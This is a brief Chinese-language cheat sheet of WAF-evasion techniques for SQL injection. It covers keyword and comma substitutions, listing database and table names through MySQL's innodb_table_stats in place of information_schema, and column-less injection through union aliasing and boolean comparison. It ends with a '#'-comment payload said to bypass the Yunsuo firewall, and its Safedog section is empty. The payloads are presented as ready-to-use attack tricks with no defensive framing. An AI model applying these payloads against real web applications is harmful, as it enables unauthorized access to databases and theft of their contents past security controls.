# WAF
---
## 通用
1. and -> %26(&)
2. , -> join
3. mysql版本大于5.6.x新增加的两个表**innodb_index_stats**和**innodb_table_stats**,主要是记录的最近数据库的变动记录,可用于代替informaiton_schema查询库名和表名.  
```sql
    select database_name from mysql.innodb_table_stats group by database_name;
    select table_name from mysql.innodb_table_stats where database_name=database();
 ```
4. 无列名注入,将目标字段与已知值联合查询,利用别名查询字段数据
```sql
    select group_concat(`2`) from (select 1,2 union select * from user)x 
```
5. 无列名注入,利用子查询一个字段一个字段进行大小比较进行布尔查询
```sql
    select ((select 1,0)>(select * from user limit 0,1))
```

## 安全狗

## 云锁
1. #后面的默认为注释,不进行检查,`?id=1#' union select user()--+`即可